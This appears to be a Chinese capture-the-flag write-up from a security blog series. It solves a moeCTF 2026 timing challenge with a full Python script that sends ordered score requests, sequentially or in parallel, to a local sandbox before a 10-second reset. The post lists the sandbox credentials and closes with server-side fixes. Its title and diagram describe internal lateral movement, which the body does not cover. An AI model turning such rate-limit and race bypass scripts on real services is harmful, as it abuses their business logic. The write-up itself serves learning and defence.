---
title: "Web 安全 + 基础设施渗透（内网横向）"
slug: "web-infrastructure-lateral"
date: 2026-09-02T19:08:30+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "业务逻辑漏洞与速率限制绕过之后，继续向基础设施层横向。"
summary: "业务逻辑漏洞与速率限制绕过之后，继续向基础设施层横向。"
tags: ["内网横向", "业务逻辑", "渗透"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 13
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/21.web安全+基础设施渗透(内网横向).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/web-infrastructure-lateral/workflow.svg" alt="公网应用进入 DMZ，通过配置和凭据触及内部主机，再扩大权限。" loading="lazy">
  <figcaption>图 1 · Web 基础设施横向。公网应用进入 DMZ，通过配置和凭据触及内部主机，再扩大权限。</figcaption>
</figure>

## 1. 题目环境

moeCTF 2026「当零来敲门」：

```text
127.0.0.1:19306   聊天服务器
127.0.0.1:19307   SSH 沙箱，账号 challenger/moectf2026
```

SSH 后 shell 被替换成 Python：

```bash
ssh challenger@127.0.0.1 -p 19307
```

目标是在机器人每 10 秒清零前，按顺序提交 1–500。

## 2. 测试接口

在授权沙箱里执行：

```python
import json, urllib.request

BASE = "http://127.0.0.1:19306"

req = urllib.request.Request(
    BASE + "/chat",
    data=json.dumps({"user": "x", "msg": 1}).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
print(urllib.request.urlopen(req, timeout=10).read().decode())
```

## 3. 完整脚本

<details>
<summary>展开完整代码：burst_score.py</summary>

```python
#!/usr/bin/env python3
"""Send ordered score messages to an authorized challenge sandbox."""

from __future__ import annotations

import argparse
import json
import threading
import time
import urllib.request


def post(base: str, user: str, score: int, timeout: float) -> str:
    body = json.dumps({"user": user, "msg": score}).encode()
    request = urllib.request.Request(
        base + "/chat",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        return response.read().decode("utf-8", errors="replace")


def sequential(base: str, user: str, limit: int, timeout: float) -> None:
    started = time.time()
    for score in range(1, limit + 1):
        text = post(base, user, score, timeout)
        if score == 1 or score % 50 == 0 or "success" in text or "flag" in text:
            print(score, text[:200])
        if "flag" in text:
            break
    print(f"elapsed={time.time() - started:.3f}s")


def parallel(base: str, user: str, limit: int, workers: int, timeout: float) -> None:
    queue = list(range(1, limit + 1))
    lock = threading.Lock()
    started = time.time()

    def worker() -> None:
        while True:
            with lock:
                if not queue:
                    return
                score = queue.pop(0)
            try:
                text = post(base, user, score, timeout)
                if score % 50 == 0 or "success" in text or "flag" in text:
                    print(score, text[:200])
                if "flag" in text:
                    return
            except Exception as exc:
                print("error", score, exc)

    threads = [threading.Thread(target=worker) for _ in range(workers)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    print(f"elapsed={time.time() - started:.3f}s")


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base", default="http://127.0.0.1:19306")
    parser.add_argument("--user", default="x")
    parser.add_argument("--limit", type=int, default=500)
    parser.add_argument("--workers", type=int, default=1)
    parser.add_argument("--timeout", type=float, default=10)
    args = parser.parse_args()

    if args.workers <= 1:
        sequential(args.base, args.user, args.limit, args.timeout)
    else:
        parallel(args.base, args.user, args.limit, args.workers, args.timeout)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

</details>

下载：[burst_score.py](/code/web-infrastructure-lateral/burst_score.py)


## 4. 运行

顺序：

```bash
python3 burst_score.py --base http://127.0.0.1:19306 --user x --limit 500
```

并发（只有接口确实按请求到达顺序计数时才使用）：

```bash
python3 burst_score.py --base http://127.0.0.1:19306 --user x --limit 500 --workers 8
```

先测 `--limit 30`，确认响应结构，再跑完整 1–500。

## 5. 关键时序

```text
机器人每 10 秒发送 0 → 重置计数
攻击者必须在 10 秒窗口内按顺序提交 1..500
```

如果顺序请求耗时超过 10 秒，要缩小网络开销：

- 复用 HTTP 连接；
- 去掉无关 Header；
- 在沙箱内直接访问 `127.0.0.1`；
- 并发版本仅在题目允许且状态按到达顺序处理时使用。

## 6. 预期结果

服务端返回中包含成功标记或 flag。记录：

- 成功时的请求号；
- 完整响应；
- 耗时；
- 是否触发重置。

## 7. 排错

| 现象 | 原因 |
| --- | --- |
| 一直返回失败 | 用户/字段名不对 |
| 中途重置 | 超过 10 秒或机器人发 0 |
| 并发反而失败 | 服务端按到达顺序/线程不安全 |
| SSH 无法进入 | 端口/账号或题目实例变化 |

## 8. 修复

- 服务端按会话串行化计数；
- 对频率和并发做明确限制；
- 重置与提交使用原子操作；
- 不把机器人节奏作为唯一安全边界。
